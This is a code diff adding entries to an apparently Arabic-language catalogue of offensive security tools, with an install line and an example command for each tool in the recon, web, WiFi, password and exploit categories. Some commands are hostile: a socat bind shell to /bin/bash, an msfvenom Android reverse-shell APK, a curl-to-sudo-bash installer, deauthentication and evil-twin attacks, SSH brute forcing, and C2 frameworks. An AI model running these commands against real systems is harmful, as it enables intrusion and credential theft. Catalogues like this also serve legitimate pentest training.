+{tool:"Puredns",category:"recon",platform:"both",difficulty:"advanced",desc:"resolver لـ DNS",install:"go install github.com/d3mondev/puredns/v2@latest",command:"puredns resolve subs.txt"},
+{tool:"Massdns",category:"recon",platform:"both",difficulty:"advanced",desc:"resolver DNS عالي السرعة",install:"# من GitHub",command:"massdns -r resolvers.txt -t A -o S subs.txt"},
+{tool:"Dnsgen",category:"recon",platform:"both",difficulty:"intermediate",desc:"توليد subdomains محتملة",install:"pip install dnsgen",command:"cat subs.txt | dnsgen - | massdns"},
+{tool:"AltDNS",category:"recon",platform:"both",difficulty:"advanced",desc:"توليد بديل DNS للـ subdomains",install:"git clone https://github.com/infosec-au/altdns",command:"python altdns.py -i subs.txt -o out.txt"},
+{tool:"CTFR",category:"recon",platform:"both",difficulty:"beginner",desc:"اكتشاف subdomains من CT logs",install:"git clone https://github.com/UnaPibaGeek/ctfr",command:"python3 ctfr.py -d target.com"},
+{tool:"Sudomy",category:"recon",platform:"both",difficulty:"advanced",desc:"إطار subdomain enumeration",install:"git clone https://github.com/screetsec/Sudomy",command:"bash sudomy -d target.com"},
+{tool:"CloudEnum",category:"recon",platform:"both",difficulty:"advanced",desc:"اكتشاف أصول سحابية",install:"git clone https://github.com/initstring/cloud_enum",command:"python3 cloud_enum.py -k keyword"},
+{tool:"S3Scanner",category:"recon",platform:"both",difficulty:"intermediate",desc:"اكتشاف S3 buckets مفتوحة",install:"pip install s3scanner",command:"s3scanner -bucket mybucket"},
+{tool:"Trufflehog",category:"recon",platform:"both",difficulty:"advanced",desc:"اكتشاف أسرار في repos",install:"# من GitHub",command:"trufflehog github --org=target"},
+{tool:"Gitleaks",category:"recon",platform:"both",difficulty:"advanced",desc:"اكتشاف أسرار في git history",install:"# من GitHub",command:"gitleaks detect --source ."},
+{tool:"Gitdorker",category:"recon",platform:"both",difficulty:"intermediate",desc:"Google dorks لـ GitHub",install:"git clone https://github.com/obheda12/GitDorker",command:"python3 GitDorker.py -tf tokens.txt -q target.com -d dorks.txt"},
+{tool:"Github-Search",category:"recon",platform:"both",difficulty:"intermediate",desc:"بحث في GitHub repos",install:"pip install github-search",command:"github-search -k api_key"},
+{tool:"Ncrack",category:"recon",platform:"both",difficulty:"advanced",desc:"كسر شبكات عالية الأداء",install:"pkg install ncrack",command:"ncrack -p 22 -U users.txt -P pass.txt 10.0.0.1"},
+{tool:"Wig",category:"recon",platform:"both",difficulty:"beginner",desc:"كشف التقنيات من CMS",install:"git clone https://github.com/jekyc/wig",command:"python3 wig.py http://t.com"},
+{tool:"Wpscan-Recon",category:"recon",platform:"both",difficulty:"intermediate",desc:"استطلاع WordPress",install:"gem install wpscan",command:"wpscan --url http://t.com --enumerate"},
+{tool:"Joomscan",category:"recon",platform:"kali",difficulty:"intermediate",desc:"فحص Joomla",install:"apt install joomscan",command:"joomscan -u http://t.com"},
+{tool:"Droopescan",category:"recon",platform:"both",difficulty:"intermediate",desc:"فحص Drupal/Joomla/etc",install:"pip install droopescan",command:"droopescan scan drupal -u http://t.com"},
+{tool:"Cmsmap",category:"recon",platform:"both",difficulty:"intermediate",desc:"كشف وتصنيف CMS",install:"pip install cmsmap",command:"cmsmap -F http://t.com"},
+{tool:"WPSeku",category:"recon",platform:"both",difficulty:"intermediate",desc:"فحص WordPress",install:"pip install wpseku",command:"wpseku -u http://t.com"},
+{tool:"Wpprobe",category:"recon",platform:"both",difficulty:"intermediate",desc:"اكتشاف إضافات WordPress",install:"git clone https://github.com/Chocapikk/wpprobe",command:"python3 wpprobe.py -u http://t.com"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Web (70 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"SQLmap",category:"web",platform:"both",difficulty:"intermediate",desc:"استغلال SQL Injection تلقائياً",install:"pip install sqlmap",command:"sqlmap -u 'http://t.com/p?id=1' --dbs --batch"},
+{tool:"FFUF",category:"web",platform:"both",difficulty:"intermediate",desc:"fuzzing سريع",install:"pkg install ffuf",command:"ffuf -w wordlist.txt -u http://t.com/FUZZ"},
+{tool:"Gobuster",category:"web",platform:"both",difficulty:"beginner",desc:"تخمين dirs/files/DNS",install:"pkg install gobuster",command:"gobuster dir -u http://t.com -w common.txt"},
+{tool:"Dirsearch",category:"web",platform:"both",difficulty:"beginner",desc:"اكتشاف ملفات مخفية",install:"pip install dirsearch",command:"dirsearch -u http://t.com -e php,asp"},
+{tool:"Nikto",category:"web",platform:"both",difficulty:"beginner",desc:"ماسح ثغرات ويب",install:"pkg install nikto",command:"nikto -h http://t.com -C all"},
+{tool:"WPScan",category:"web",platform:"both",difficulty:"intermediate",desc:"فحص WordPress",install:"gem install wpscan",command:"wpscan --url http://t.com --enumerate"},
+{tool:"XSStrike",category:"web",platform:"both",difficulty:"advanced",desc:"XSS ذكي",install:"git clone https://github.com/s0md3v/XSStrike",command:"python xsstrike.py -u 'http://t.com/s?q=x'"},
+{tool:"Dalfox",category:"web",platform:"both",difficulty:"advanced",desc:"ماسح XSS حديث",install:"go install github.com/hahwul/dalfox/v2@latest",command:"dalfox url http://t.com/s?q=x"},
+{tool:"Commix",category:"web",platform:"both",difficulty:"advanced",desc:"Command Injection",install:"git clone https://github.com/commixproject/commix",command:"python commix.py -u 'http://t.com/p?c=id'"},
+{tool:"Wfuzz",category:"web",platform:"both",difficulty:"intermediate",desc:"fuzzing مرن",install:"pip install wfuzz",command:"wfuzz -c -z file,words.txt http://t.com/FUZZ"},
+{tool:"Arjun",category:"web",platform:"both",difficulty:"intermediate",desc:"parameters مخفية",install:"pip install arjun",command:"arjun -u http://t.com/endpoint"},
+{tool:"ParamSpider",category:"web",platform:"both",difficulty:"beginner",desc:"parameters من أرشيف",install:"git clone https://github.com/devanshbatham/ParamSpider",command:"python paramspider.py -d target.com"},
+{tool:"Corsy",category:"web",platform:"both",difficulty:"intermediate",desc:"ثغرات CORS",install:"pip install corsy",command:"python corsy.py -u http://t.com"},
+{tool:"Tplmap",category:"web",platform:"both",difficulty:"advanced",desc:"SSTI exploit",install:"git clone https://github.com/epinna/tplmap",command:"python tplmap.py -u 'http://t.com?n=test'"},
+{tool:"SSRFmap",category:"web",platform:"both",difficulty:"advanced",desc:"SSRF methodology",install:"git clone https://github.com/swisskyrepo/SSRFmap",command:"python ssrfmap.py -r req.txt -p url"},
+{tool:"Ghauri",category:"web",platform:"both",difficulty:"intermediate",desc:"بديل حديث SQLMap",install:"pip install ghauri",command:"ghauri -u 'http://t.com?id=1' --dbs"},
+{tool:"GraphQLmap",category:"web",platform:"both",difficulty:"advanced",desc:"GraphQL exploitation",install:"pip install graphqlmap",command:"graphqlmap -u http://t.com/graphql"},
+{tool:"Feroxbuster",category:"web",platform:"both",difficulty:"intermediate",desc:"تخمين محتوى بـ Rust",install:"# من GitHub",command:"feroxbuster -u http://t.com -w words.txt"},
+{tool:"X8",category:"web",platform:"both",difficulty:"advanced",desc:"parameters مخفية",install:"cargo install x8",command:"x8 -u 'http://t.com' -w params.txt"},
+{tool:"Kiterunner",category:"web",platform:"kali",difficulty:"advanced",desc:"API endpoints",install:"go install github.com/assetnote/kiterunner/cmd/kr@latest",command:"kr scan http://t.com -w routes.kite"},
+{tool:"Subjack",category:"web",platform:"both",difficulty:"intermediate",desc:"Subdomain takeover",install:"go install github.com/haccer/subjack@latest",command:"subjack -w subs.txt"},
+{tool:"Jaeles",category:"web",platform:"both",difficulty:"advanced",desc:"فحص بقوالب",install:"go install github.com/jaeles-project/jaeles@latest",command:"jaeles scan -u http://t.com"},
+{tool:"WhatWaf",category:"web",platform:"both",difficulty:"intermediate",desc:"كشف WAF",install:"pip install whatwaf",command:"whatwaf -u http://t.com"},
+{tool:"JWT Tool",category:"web",platform:"both",difficulty:"intermediate",desc:"تحليل JWT",install:"pip install jwt-tool",command:"python jwt_tool.py <JWT>"},
+{tool:"Smuggler",category:"web",platform:"both",difficulty:"expert",desc:"HTTP Request Smuggling",install:"git clone https://github.com/defparam/smuggler",command:"python3 smuggler.py -u http://t.com"},
+{tool:"XXEinjector",category:"web",platform:"both",difficulty:"advanced",desc:"XXE exploitation",install:"git clone https://github.com/enjoiz/XXEinjector",command:"ruby XXEinjector.rb --host=t.com"},
+{tool:"CrackQL",category:"web",platform:"both",difficulty:"advanced",desc:"GraphQL brute force",install:"git clone https://github.com/nicholasaleks/CrackQL",command:"python3 CrackQL.py -t query.graphql"},
+{tool:"InQL",category:"web",platform:"both",difficulty:"advanced",desc:"GraphQL scanner",install:"pip install inql",command:"inql -t http://t.com/graphql"},
+{tool:"Nosqlmap",category:"web",platform:"both",difficulty:"advanced",desc:"NoSQL Injection",install:"git clone https://github.com/codingo/NoSQLMap",command:"python NoSQLMap.py"},
+{tool:"Sstimap",category:"web",platform:"both",difficulty:"advanced",desc:"SSTI modern",install:"pip install sstimap",command:"sstimap -u 'http://t.com?name=x'"},
+{tool:"Crlfuzz",category:"web",platform:"both",difficulty:"intermediate",desc:"CRLF Injection",install:"go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest",command:"crlfuzz -u 'http://t.com'"},
+{tool:"Nuclei-Fuzz",category:"web",platform:"both",difficulty:"advanced",desc:"fuzzing مع Nuclei",install:"pkg install nuclei",command:"nuclei -u http://t.com -t fuzzing/"},
+{tool:"Wapiti",category:"web",platform:"both",difficulty:"advanced",desc:"ماسح ثغرات شامل",install:"pip install wapiti3",command:"wapiti -u http://t.com"},
+{tool:"Skipfish",category:"web",platform:"kali",difficulty:"advanced",desc:"ماسح Google القديم",install:"apt install skipfish",command:"skipfish -o out http://t.com"},
+{tool:"ZAP",category:"web",platform:"both",difficulty:"advanced",desc:"OWASP ZAP",install:"# تحميل من الموقع",command:"zap.sh -cmd -quickurl http://t.com"},
+{tool:"W3af",category:"web",platform:"kali",difficulty:"expert",desc:"إطار فحص شامل",install:"apt install w3af",command:"w3af_console"},
+{tool:"Arachni",category:"web",platform:"kali",difficulty:"expert",desc:"سكانر ويب متقدم",install:"# من GitHub",command:"arachni http://t.com"},
+{tool:"Grabber",category:"web",platform:"kali",difficulty:"intermediate",desc:"ماسح ويب بسيط",install:"pip install grabber",command:"grabber http://t.com"},
+{tool:"Vega",category:"web",platform:"kali",difficulty:"advanced",desc:"واجهة فحص ويب",install:"# من الموقع",command:"vega"},
+{tool:"XSSer",category:"web",platform:"both",difficulty:"intermediate",desc:"XSS framework",install:"apt install xsser",command:"xsser -u 'http://t.com?q=XSS'"},
+{tool:"XSS-Scan",category:"web",platform:"both",difficulty:"intermediate",desc:"ماسح XSS بسيط",install:"pip install xss-scan",command:"xss-scan http://t.com"},
+{tool:"Sqlmate",category:"web",platform:"both",difficulty:"intermediate",desc:"SQLi helper",install:"pip install sqlmate",command:"sqlmate -d target.com"},
+{tool:"Blisqy",category:"web",platform:"both",difficulty:"advanced",desc:"Time-based Blind SQLi",install:"git clone https://github.com/JohnTroony/Blisqy",command:"python blisqy.py --server t.com"},
+{tool:"Js2py",category:"web",platform:"both",difficulty:"intermediate",desc:"تحليل JavaScript",install:"pip install js2py",command:"python -m js2py"},
+{tool:"LinkFinder",category:"web",platform:"both",difficulty:"intermediate",desc:"اكتشاف endpoints من JS",install:"git clone https://github.com/GerbenJavado/LinkFinder",command:"python linkfinder.py -i js_file.js"},
+{tool:"SecretFinder",category:"web",platform:"both",difficulty:"intermediate",desc:"اكتشاف أسرار في JS",install:"git clone https://github.com/m4ll0k/SecretFinder",command:"python SecretFinder.py -i js_file.js"},
+{tool:"Subjs",category:"web",platform:"both",difficulty:"intermediate",desc:"اكتشاف JS files",install:"go install github.com/lc/subjs@latest",command:"cat urls.txt | subjs"},
+{tool:"Jsluice",category:"web",platform:"both",difficulty:"advanced",desc:"استخراج URLs من JS",install:"go install github.com/BishopFox/jsluice/cmd/jsluice@latest",command:"jsluice urls script.js"},
+{tool:"XS-Search",category:"web",platform:"both",difficulty:"expert",desc:"XS-Leaks detection",install:"# يدوي",command:"# راجع xsleaks.dev"},
+{tool:"PostMessage-Tracker",category:"web",platform:"both",difficulty:"advanced",desc:"تتبع postMessage",install:"# browser dev tools",command:"# يدوي"},
+{tool:"Dompurify",category:"web",platform:"both",difficulty:"advanced",desc:"DOM Clobbering / XSS",install:"# يدوي",command:"# يدوي"},
+{tool:"Bypass-403",category:"web",platform:"both",difficulty:"intermediate",desc:"تخطي 403",install:"git clone https://github.com/iamj0ker/bypass-403",command:"bash bypass-403.sh http://t.com/path"},
+{tool:"Wafw00f-Plus",category:"web",platform:"both",difficulty:"intermediate",desc:"كشف WAF متقدم",install:"pip install wafw00f",command:"wafw00f -a http://t.com"},
+{tool:"Waf-Bypass",category:"web",platform:"both",difficulty:"expert",desc:"تخطي WAF",install:"git clone https://github.com/Red-Laboratory/WAF-Bypass",command:"# يدوي"},
+{tool:"H2Csmuggler",category:"web",platform:"both",difficulty:"expert",desc:"H2C Smuggling",install:"git clone https://github.com/BishopFox/h2csmuggler",command:"python h2csmuggler.py -u http://t.com"},
+{tool:"HTTP2smugl",category:"web",platform:"both",difficulty:"expert",desc:"HTTP/2 smuggling",install:"# من GitHub",command:"# يدوي"},
+{tool:"Web-Cache-Deception",category:"web",platform:"both",difficulty:"expert",desc:"cache deception testing",install:"git clone https://github.com/arbazkiraak/WebCacheDeception",command:"python wcd.py -u http://t.com"},
+{tool:"Host-Header-Injection",category:"web",platform:"both",difficulty:"advanced",desc:"Host header attacks",install:"pip install host-header-injection",command:"# يدوي"},
+{tool:"Ssrf-Exploiter",category:"web",platform:"both",difficulty:"advanced",desc:"SSRF helper",install:"# من GitHub",command:"# يدوي"},
+{tool:"Blind-SSRF",category:"web",platform:"both",difficulty:"expert",desc:"Blind SSRF detection",install:"# interactive",command:"# استخدم Burp Collaborator"},
+{tool:"Deserialization-Checker",category:"web",platform:"both",difficulty:"expert",desc:"فحص deserialization",install:"# يدوي",command:"# يدوي"},
+{tool:"Ysoserial",category:"web",platform:"kali",difficulty:"expert",desc:"Java deserialization",install:"# من GitHub",command:"java -jar ysoserial.jar CommonsCollections1 'cmd'"},
+{tool:"PHPGGC",category:"web",platform:"both",difficulty:"expert",desc:"PHP deserialization gadgets",install:"git clone https://github.com/ambionics/phpggc",command:"./phpggc Laravel/RCE1 system id"},
+{tool:"PadBuster",category:"web",platform:"kali",difficulty:"advanced",desc:"Padding Oracle",install:"apt install padbuster",command:"padbuster http://t.com cookie 8 -encoding 0"},
+{tool:"Padding-Oracle",category:"web",platform:"both",difficulty:"expert",desc:"Padding oracle detection",install:"# Python",command:"# يدوي"},
+{tool:"Cookie-Stealer",category:"web",platform:"both",difficulty:"intermediate",desc:"تحليل cookies",install:"# يدوي",command:"# DevTools"},
+{tool:"EditThisCookie",category:"web",platform:"both",difficulty:"beginner",desc:"تحرير cookies",install:"# متصفح",command:"# extension"},
+{tool:"OWASP-Juice",category:"web",platform:"both",difficulty:"beginner",desc:"تطبيق Juice Shop للتدريب",install:"docker pull bkimminich/juice-shop",command:"docker run -p 3000:3000 bkimminich/juice-shop"},
+{tool:"DVWA",category:"web",platform:"both",difficulty:"beginner",desc:"Damn Vulnerable Web App",install:"docker pull vulnerables/web-dvwa",command:"docker run -p 80:80 vulnerables/web-dvwa"},
+{tool:"WebGoat",category:"web",platform:"both",difficulty:"beginner",desc:"OWASP WebGoat",install:"docker pull webgoat/webgoat",command:"docker run -p 8080:8080 webgoat/webgoat"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — WiFi (30 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Aircrack-ng",category:"wifi",platform:"both",difficulty:"intermediate",desc:"كسر WPA/WPA2",install:"pkg install aircrack-ng",note:"يتطلب Root",command:"airmon-ng start wlan0 && airodump-ng wlan0mon"},
+{tool:"Wifite2",category:"wifi",platform:"both",difficulty:"intermediate",desc:"أتمتة هجمات WiFi",install:"git clone https://github.com/derv82/wifite2",note:"يتطلب Root",command:"python wifite.py --kill"},
+{tool:"Reaver",category:"wifi",platform:"both",difficulty:"advanced",desc:"هجوم WPS PIN",install:"pkg install reaver",note:"يتطلب Root",command:"reaver -i wlan0mon -b BSSID -vv -K 1"},
+{tool:"Bettercap",category:"wifi",platform:"both",difficulty:"advanced",desc:"إطار MITM",install:"pkg install bettercap",note:"يتطلب Root",command:"bettercap -iface wlan0"},
+{tool:"hcxdumptool",category:"wifi",platform:"kali",difficulty:"expert",desc:"PMKID capture",install:"apt install hcxdumptool",note:"يتطلب Root",command:"hcxdumptool -i wlan0mon -o cap.pcapng"},
+{tool:"hcxtools",category:"wifi",platform:"kali",difficulty:"advanced",desc:"تحويل handshakes",install:"apt install hcxtools",command:"hcxpcapngtool -o hash.hc22000 cap.pcapng"},
+{tool:"Kismet",category:"wifi",platform:"kali",difficulty:"intermediate",desc:"كاشف شبكات",install:"apt install kismet",command:"kismet -c wlan0"},
+{tool:"mdk4",category:"wifi",platform:"kali",difficulty:"advanced",desc:"هجمات Deauth",install:"apt install mdk4",note:"يتطلب Root",command:"mdk4 wlan0mon d -c 6"},
+{tool:"Wash",category:"wifi",platform:"both",difficulty:"beginner",desc:"اكتشاف WPS",install:"pkg install reaver",note:"يتطلب Root",command:"wash -i wlan0mon"},
+{tool:"Airgeddon",category:"wifi",platform:"kali",difficulty:"advanced",desc:"سكربت شامل WiFi",install:"git clone https://github.com/v1s1t0r1sh3r3/airgeddon",command:"bash airgeddon.sh"},
+{tool:"Wifiphisher",category:"wifi",platform:"kali",difficulty:"expert",desc:"Rogue AP",install:"git clone https://github.com/wifiphisher/wifiphisher",command:"python wifiphisher.py"},
+{tool:"Fluxion",category:"wifi",platform:"kali",difficulty:"expert",desc:"Evil Twin",install:"git clone https://github.com/FluxionNetwork/fluxion",command:"bash fluxion.sh"},
+{tool:"EAPHammer",category:"wifi",platform:"kali",difficulty:"expert",desc:"WPA2-Enterprise",install:"git clone https://github.com/s0lst1c3/eaphammer",command:"python eaphammer --interface wlan0"},
+{tool:"WiFi-Pumpkin",category:"wifi",platform:"kali",difficulty:"advanced",desc:"Rogue AP framework",install:"git clone https://github.com/P0cL4bs/wifipumpkin3",command:"wifipumpkin3"},
+{tool:"Bully",category:"wifi",platform:"both",difficulty:"advanced",desc:"WPS attack",install:"pkg install bully",note:"يتطلب Root",command:"bully wlan0mon -b BSSID -S -F"},
+{tool:"Pixiewps",category:"wifi",platform:"both",difficulty:"advanced",desc:"WPS Pixie Dust",install:"pkg install pixiewps",note:"يتطلب Root",command:"pixiewps -e PKE -r PKR -s E-HASH1 -z E-HASH2"},
+{tool:"Airodump-ng",category:"wifi",platform:"both",difficulty:"beginner",desc:"التقاط حزم",install:"pkg install aircrack-ng",note:"يتطلب Root",command:"airodump-ng wlan0mon"},
+{tool:"Aireplay-ng",category:"wifi",platform:"both",difficulty:"intermediate",desc:"Injection attacks",install:"pkg install aircrack-ng",note:"يتطلب Root",command:"aireplay-ng --deauth 10 -a BSSID wlan0mon"},
+{tool:"Airmon-ng",category:"wifi",platform:"both",difficulty:"beginner",desc:"Monitor mode",install:"pkg install aircrack-ng",note:"يتطلب Root",command:"airmon-ng start wlan0"},
+{tool:"Wifite",category:"wifi",platform:"both",difficulty:"intermediate",desc:"Wifite النسخة الأصلية",install:"git clone https://github.com/derv82/wifite",command:"python wifite.py"},
+{tool:"Cowpatty",category:"wifi",platform:"kali",difficulty:"advanced",desc:"كسر WPA",install:"apt install cowpatty",command:"cowpatty -r capture.cap -f dict.txt -s SSID"},
+{tool:"Pyrit",category:"wifi",platform:"kali",difficulty:"expert",desc:"GPU WPA cracker",install:"apt install pyrit",command:"pyrit -r capture.cap attack_pmk"},
+{tool:"Owl",category:"wifi",platform:"kali",difficulty:"advanced",desc:"WPA toolkit",install:"git clone https://github.com/mr-linch/Owl",command:"# يدوي"},
+{tool:"Wi-Fi-Detector",category:"wifi",platform:"both",difficulty:"beginner",desc:"كشف شبكات",install:"# من GitHub",command:"# يدوي"},
+{tool:"Wireshark-WiFi",category:"wifi",platform:"kali",difficulty:"advanced",desc:"تحليل WiFi",install:"apt install wireshark",command:"wireshark -i wlan0"},
+{tool:"Airbase-ng",category:"wifi",platform:"both",difficulty:"advanced",desc:"إنشاء AP وهمي",install:"pkg install aircrack-ng",note:"يتطلب Root",command:"airbase-ng -e FakeAP -c 6 wlan0mon"},
+{tool:"Airdecap-ng",category:"wifi",platform:"both",difficulty:"advanced",desc:"فك تشفير packets",install:"pkg install aircrack-ng",command:"airdecap-ng -p password capture.cap"},
+{tool:"Eapmd5pass",category:"wifi",platform:"kali",difficulty:"advanced",desc:"EAP-MD5 attack",install:"apt install eapmd5pass",command:"eapmd5pass -r cap -w dict"},
+{tool:"Asleap",category:"wifi",platform:"kali",difficulty:"expert",desc:"LEAP attack",install:"apt install asleap",command:"asleap -r dump -w dict"},
+{tool:"FreeRADIUS-WPE",category:"wifi",platform:"kali",difficulty:"expert",desc:"Rogue RADIUS",install:"# من GitHub",command:"radiusd -X"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Passwords (30 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Hashcat",category:"password",platform:"kali",difficulty:"advanced",desc:"أسرع كاسر هاشات",install:"apt install hashcat",command:"hashcat -m 1000 -a 0 h.txt rockyou.txt"},
+{tool:"John",category:"password",platform:"both",difficulty:"intermediate",desc:"John the Ripper",install:"pkg install john",command:"john --wordlist=rockyou.txt hashes.txt"},
+{tool:"Hydra",category:"password",platform:"both",difficulty:"intermediate",desc:"Brute-force 50+ بروتوكول",install:"pkg install hydra",command:"hydra -l admin -P pass.txt ssh://10.0.0.1"},
+{tool:"Medusa",category:"password",platform:"both",difficulty:"intermediate",desc:"Brute-force متوازي",install:"pkg install medusa",command:"medusa -h 10.0.0.1 -u admin -P pass.txt -M ssh"},
+{tool:"Ncrack",category:"password",platform:"both",difficulty:"advanced",desc:"شبكات كاسر",install:"pkg install ncrack",command:"ncrack -p 22 -U users.txt -P pass.txt 10.0.0.1"},
+{tool:"Crunch",category:"password",platform:"both",difficulty:"beginner",desc:"توليد wordlists",install:"pkg install crunch",command:"crunch 8 8 -t ,,,,,,@@ -o list.txt"},
+{tool:"Cupp",category:"password",platform:"both",difficulty:"beginner",desc:"wordlist شخصي",install:"git clone https://github.com/Mebus/cupp",command:"python cupp.py -i"},
+{tool:"CeWL",category:"password",platform:"both",difficulty:"intermediate",desc:"استخراج كلمات من موقع",install:"gem install cewl",command:"cewl http://t.com -d 3 -m 6 -w words.txt"},
+{tool:"Hash-Identifier",category:"password",platform:"both",difficulty:"beginner",desc:"تحديد hash type",install:"pip install hashid",command:"hashid '5f4dcc3b5aa765d61d8327deb882cf99'"},
+{tool:"fcrackzip",category:"password",platform:"both",difficulty:"beginner",desc:"كسر ZIP",install:"pkg install fcrackzip",command:"fcrackzip -u -D -p rockyou.txt f.zip"},
+{tool:"pdfcrack",category:"password",platform:"both",difficulty:"beginner",desc:"كسر PDF",install:"pkg install pdfcrack",command:"pdfcrack -f secret.pdf -w rockyou.txt"},
+{tool:"rarcrack",category:"password",platform:"both",difficulty:"beginner",desc:"كسر RAR",install:"pkg install rarcrack",command:"rarcrack file.rar"},
+{tool:"Ophcrack",category:"password",platform:"kali",difficulty:"advanced",desc:"Windows hashes",install:"apt install ophcrack",command:"ophcrack -g -d tables/ -f hashes.txt"},
+{tool:"Patator",category:"password",platform:"both",difficulty:"advanced",desc:"Brute-force modular",install:"pip install patator",command:"patator ssh_login host=10.0.0.1 user=admin password=FILE0 0=pass.txt"},
+{tool:"Crowbar",category:"password",platform:"kali",difficulty:"intermediate",desc:"Brute-force RDP/SSH",install:"apt install crowbar",command:"crowbar -b ssh -s 10.0.0.1/32 -u admin -C pass.txt"},
+{tool:"Kerbrute",category:"password",platform:"both",difficulty:"advanced",desc:"Kerberos bruteforce",install:"go install github.com/ropnop/kerbrute@latest",command:"kerbrute userenum -d d.local users.txt"},
+{tool:"Pipal",category:"password",platform:"both",difficulty:"intermediate",desc:"تحليل كلمات مرور",install:"git clone https://github.com/digininja/pipal",command:"ruby pipal.rb passwords.txt"},
+{tool:"Crackstation-Human",category:"password",platform:"both",difficulty:"beginner",desc:"Human-only wordlist",install:"# تحميل",command:"# من crackstation.net"},
+{tool:"SecLists",category:"password",platform:"both",difficulty:"beginner",desc:"مجموعة wordlists",install:"git clone https://github.com/danielmiessler/SecLists",command:"ls SecLists/Passwords/"},
+{tool:"Weakpass",category:"password",platform:"both",difficulty:"beginner",desc:"wordlists",install:"# تحميل",command:"# من weakpass.com"},
+{tool:"Wordlists",category:"password",platform:"both",difficulty:"beginner",desc:"wordlists جاهزة",install:"git clone https://github.com/dw0rsec/Wordlists",command:"ls Wordlists/"},
+{tool:"Bopscrk",category:"password",platform:"both",difficulty:"intermediate",desc:"wordlist ذكي",install:"pip install bopscrk",command:"bopscrk -i"},
+{tool:"Pydictor",category:"password",platform:"both",difficulty:"intermediate",desc:"wordlist generator",install:"git clone https://github.com/LandGrey/pydictor",command:"python pydictor.py"},
+{tool:"Wlmaker",category:"password",platform:"both",difficulty:"intermediate",desc:"wordlist maker",install:"git clone https://github.com/Z4nzu/wlmaker",command:"python wlmaker.py"},
+{tool:"Haklistgen",category:"password",platform:"both",difficulty:"intermediate",desc:"wordlist generator",install:"git clone https://github.com/hakluke/haklistgen",command:"haklistgen words.txt"},
+{tool:"Cewler",category:"password",platform:"both",difficulty:"intermediate",desc:"CeWL بـ Python",install:"pip install cewler",command:"cewler -u http://t.com"},
+{tool:"Mentalist",category:"password",platform:"both",difficulty:"intermediate",desc:"wordlist GUI",install:"# تحميل",command:"mentalist"},
+{tool:"Hashtopolis",category:"password",platform:"both",difficulty:"expert",desc:"موزع hashcat",install:"# من GitHub",command:"# server setup"},
+{tool:"MDXfind",category:"password",platform:"kali",difficulty:"advanced",desc:"كاسر هاشات",install:"# من hashcat.net",command:"mdxfind -h hashes.txt -d dict.txt"},
+{tool:"Hob0Rules",category:"password",platform:"both",difficulty:"advanced",desc:"قواعد hashcat",install:"# من GitHub",command:"hashcat -r hob064.rule"}
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Exploit (50 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Metasploit",category:"exploit",platform:"both",difficulty:"advanced",desc:"إطار الاستغلال الأشهر — 2000+ exploit",install:"pkg install unstable-repo && pkg install metasploit",command:"msfconsole -q"},
+{tool:"msfvenom",category:"exploit",platform:"both",difficulty:"intermediate",desc:"توليد payloads",install:"# مع Metasploit",command:"msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o app.apk"},
+{tool:"Searchsploit",category:"exploit",platform:"both",difficulty:"beginner",desc:"بحث في Exploit-DB",install:"pkg install exploitdb",command:"searchsploit apache 2.4.49"},
+{tool:"Netcat",category:"exploit",platform:"both",difficulty:"beginner",desc:"أداة شبكات خارقة",install:"pkg install netcat-openbsd",command:"nc -lvnp 4444"},
+{tool:"Socat",category:"exploit",platform:"both",difficulty:"intermediate",desc:"بديل Netcat متقدم",install:"pkg install socat",command:"socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash"},
+{tool:"pwncat-cs",category:"exploit",platform:"both",difficulty:"advanced",desc:"Netcat حديث",install:"pip install pwncat-cs",command:"pwncat-cs -lp 4444"},
+{tool:"Routersploit",category:"exploit",platform:"both",difficulty:"advanced",desc:"استغلال الراوترات",install:"git clone https://github.com/threat9/routersploit",command:"python rsf.py"},
+{tool:"BeEF",category:"exploit",platform:"kali",difficulty:"expert",desc:"استغلال المتصفحات",install:"apt install beef-xss",command:"beef-xss"},
+{tool:"Empire",category:"exploit",platform:"kali",difficulty:"expert",desc:"post-exploitation",install:"apt install powershell-empire",command:"powershell-empire server"},
+{tool:"Sliver",category:"exploit",platform:"both",difficulty:"expert",desc:"C2 من BishopFox",install:"curl https://sliver.sh/install | sudo bash",command:"sliver"},
+{tool:"Havoc",category:"exploit",platform:"kali",difficulty:"expert",desc:"إطار C2 حديث",install:"git clone https://github.com/HavocFramework/Havoc",command:"./havoc"},
+{tool:"Cobalt-Strike",category:"exploit",platform:"kali",difficulty:"legendary",desc:"إطار تجاري",install:"# مدفوع",command:"# راجع الوثائق"},
+{tool:"Mythic",category:"exploit",platform:"kali",difficulty:"expert",desc:"C2 متعدد المنصات",install:"git clone https://github.com/its-a-feature/Mythic",command:"sudo ./mythic-cli start"},
+{tool:"Covenant",category:"exploit",platform:"kali",difficulty:"expert",desc:"C2 .NET",install:"git clone https://github.com/cobbr/Covenant",command:"dotnet run"},
+{tool:"Merlin",category:"exploit",platform:"kali",difficulty:"expert",desc:"C2 HTTP/2",install:"git clone https://github.com/Ne0nd0g/merlin",command:"./merlin-server"},
+{tool:"PoshC2",category:"exploit",platform:"kali",difficulty:"expert",desc:"C2 PowerShell",install:"git clone https://github.com/nettitude/PoshC2",command:"poshc2"},
+{tool:"Nishang",category:"exploit",platform:"kali",difficulty:"expert",desc:"PowerShell toolkit",install:"git clone https://github.com/samratashok/nishang",command:"# قوالب جاهزة"},
+{tool:"PowerSploit",category:"exploit",platform:"kali",difficulty:"expert",desc:"PowerShell exploitation",install:"git clone https://github.com/PowerShellMafia/PowerSploit",command:"Import-Module PowerSploit.psd1"},
+{tool:"SharpSploit",category:"exploit",platform:"kali",difficulty:"expert",desc:".NET exploitation",install:"git clone https://github.com/cobbr/SharpSploit",command:"# compile + run"},
+{tool:"Donut",category:"exploit",platform:"kali",difficulty:"expert",desc:"تحويل payloads لـ shellcode",install:"git clone https://github.com/TheWover/donut",command:"./donut -f 1 -o payload.bin"},
+{tool:"Veil",category:"exploit",platform:"kali",difficulty:"advanced",desc:"توليد payloads متخفي",install:"apt install veil",command:"veil"},
